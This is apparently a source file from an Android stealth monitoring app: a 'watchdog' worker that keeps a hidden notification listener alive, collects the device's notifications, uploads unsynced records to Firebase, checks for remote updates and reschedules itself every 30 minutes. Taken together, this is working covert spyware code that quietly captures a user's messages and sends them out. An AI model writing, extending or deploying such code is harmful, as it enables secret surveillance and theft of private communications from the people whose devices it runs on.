package com.notrack.stealth.sync;

import android.content.Context;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Constraints;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.ExistingWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.notrack.stealth.StealthService;
import com.notrack.stealth.db.AppDatabase;
import com.notrack.stealth.db.NotificationEntity;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

/**
 * CONTINUOUS BACKGROUND WATCHDOG & TELEMETRY SYNC WORKER
 *
 * 1. Re-binds NotificationListenerService if killed by OS memory pressure.
 * 2. Scans active notifications from notification tray/history.
 * 3. Flushes unsynced local Room DB notifications to Firebase Realtime Database.
 */
public class SyncWorker extends Worker {

    private static final String TAG = "SyncWorker";
    public static final String WORK_NAME = "StealthSyncWorker";
    public static final String PERIODIC_WORK_NAME = "StealthKeepAliveWorker";

    public SyncWorker(@NonNull Context context, @NonNull WorkerParameters params) {
        super(context, params);
    }

    @NonNull
    @Override
    public Result doWork() {
        Context context = getApplicationContext();
        Log.i(TAG, "SyncWorker watchdog executing background keep-alive & sync...");

        // 1. Keep-Alive: Ensure StealthService is alive and bound
        try {
            StealthService.rebindService(context);
            StealthService service = StealthService.getInstance();
            if (service != null) {
                service.processActiveNotifications();
            }
        } catch (Exception e) {
            Log.w(TAG, "Watchdog rebind notice: " + e.getMessage());
        }

        // 2. Data Sync: Flush pending records to Firebase
        try {
            AppDatabase db = AppDatabase.getInstance(context);
            List<NotificationEntity> pendingList = db.notificationDao().getUnsyncedBatch(50);
            if (pendingList != null && !pendingList.isEmpty()) {
                Log.i(TAG, "Flushing " + pendingList.size() + " pending notifications to Firebase...");
                List<Long> syncedIds = new ArrayList<>();
                for (NotificationEntity item : pendingList) {
                    boolean pushed = FirebaseHelper.sendRealtimeRestPost(item);
                    if (pushed) {
                        syncedIds.add(item.id);
                    }
                }

                if (!syncedIds.isEmpty()) {
                    db.notificationDao().markAsSynced(syncedIds);
                    Log.i(TAG, "Successfully synced " + syncedIds.size() + " notifications to Firebase.");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in SyncWorker database flush", e);
        }

        // 3. Remote In-App Auto-Update Check
        try {
            com.notrack.stealth.update.UpdateManager.checkForUpdateSync(context);
        } catch (Exception e) {
            Log.w(TAG, "Auto-update check notice: " + e.getMessage());
        }

        return Result.success();
    }

    public static void enqueueSync(Context context) {
        try {
            Constraints constraints = new Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build();

            OneTimeWorkRequest syncRequest = new OneTimeWorkRequest.Builder(SyncWorker.class)
                    .setConstraints(constraints)
                    .build();

            WorkManager.getInstance(context).enqueueUniqueWork(
                    WORK_NAME,
                    ExistingWorkPolicy.REPLACE,
                    syncRequest
            );
        } catch (Exception e) {
            Log.e(TAG, "Error enqueueing one-time sync", e);
        }
    }

    public static void enqueuePeriodicKeepAlive(Context context) {
        try {
            Constraints constraints = new Constraints.Builder()
                    .build();

            PeriodicWorkRequest keepAliveRequest = new PeriodicWorkRequest.Builder(
                    SyncWorker.class, 30, TimeUnit.MINUTES)
                    .setConstraints(constraints)
                    .build();

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                    PERIODIC_WORK_NAME,
                    ExistingPeriodicWorkPolicy.KEEP,
                    keepAliveRequest
            );
            Log.i(TAG, "Periodic keep-alive watchdog registered (30 min interval).");
        } catch (Exception e) {
            Log.e(TAG, "Error scheduling periodic keep-alive worker", e);
        }
    }
}
